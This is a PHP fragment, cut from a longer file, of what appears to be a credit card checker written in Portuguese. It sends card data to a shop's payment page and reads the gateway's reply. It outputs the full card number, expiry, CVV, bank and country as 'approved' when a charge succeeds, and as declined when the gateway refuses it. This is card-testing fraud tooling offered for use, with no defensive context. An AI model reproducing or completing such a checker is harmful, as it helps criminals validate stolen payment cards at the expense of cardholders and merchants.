...
exit('<b><span class="badge badge-success badge-glow"> aprovadas </span> → '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  </span> '.$bandeira.' '.$banco.' '.$level.' '.$pais.' <span class="badge badge-info">[  QR CODE ]</span> QR CODE ➜ ' . (time() - $time) .  ' Seg</b><br>');

}elseif (strpos($result, 'Clique em Voltar para retornar ao site da loja e escolha outra forma de pagamento')) {
	exit("<span class='badge badge-danger'>#Reprovada</span><span style='color:white;'> $lista</span> <span style='color:red;'>(CARTAO RECUSADO!)</span> <span class='badge badge-light'> [noreply]</span>");
}
